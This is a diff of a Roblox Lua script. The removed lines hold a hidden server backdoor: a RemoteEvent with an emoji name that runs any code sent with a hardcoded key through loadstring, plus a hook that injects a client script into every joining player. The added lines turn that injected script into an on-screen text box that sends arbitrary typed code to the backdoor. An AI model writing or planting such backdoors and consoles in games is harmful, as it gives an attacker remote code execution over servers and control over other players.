@@ -1,42 +1,31 @@
-local RS = game:GetService("ReplicatedStorage")
-local HS = game:GetService("HttpService")
-local PS = game:GetService("Players")
-
-local function _G_INIT()
-    local k = "TheOneTrueKey42"
-    local id = "\240\159\141\149"
-    
-    local e = Instance.new("RemoteEvent")
-    e.Name = id
-    e.Parent = RS
-    
-    e.OnServerEvent:Connect(function(p, ak, src)
-        if ak == k then
-            local f, err = loadstring(src)
-            if f then
-                task.spawn(f, p)
-            end
-        end
-    end)
-end
-
 local function _C_INJECT(p)
     local s = Instance.new("LocalScript")
-    s.Name = " "
+    s.Name = "CH_Terminal"
     s.Source = [[
         local r = game:GetService("ReplicatedStorage")
         local i = "\240\159\141\149"
         local k = "TheOneTrueKey42"
         local ev = r:WaitForChild(i)
+
+        -- Создаем GUI для ввода кода
+        local sg = Instance.new("ScreenGui", game:GetService("CoreGui") or script.Parent)
+        local frame = Instance.new("Frame", sg)
+        frame.Size = UDim2.new(0, 300, 0, 50)
+        frame.Position = UDim2.new(0.5, -150, 0, 10)
         
-        local payload = "local p = ...; p.Character.Humanoid.MaxHealth = math.huge; p.Character.Humanoid.Health = math.huge"
-        ev:FireServer(k, payload)
+        local input = Instance.new("TextBox", frame)
+        input.Size = UDim2.new(1, 0, 1, 0)
+        input.PlaceholderText = "Введи код (напр. game.Workspace.Part:Destroy())"
+        input.Text = ""
+
+        input.FocusLost:Connect(function(enterPressed)
+            if enterPressed and input.Text ~= "" then
+                -- Отправляем твой текст прямо в loadstring на сервер
+                ev:FireServer(k, input.Text)
+                print("Код отправлен: " .. input.Text)
+                input.Text = ""
+            end
+        end)
     ]]
     s.Parent = p:WaitForChild("PlayerGui")
 end
-
-task.spawn(_G_INIT)
-PS.PlayerAdded:Connect(function(p)
-    p.CharacterAdded:Wait()
-    _C_INJECT(p)
-end)
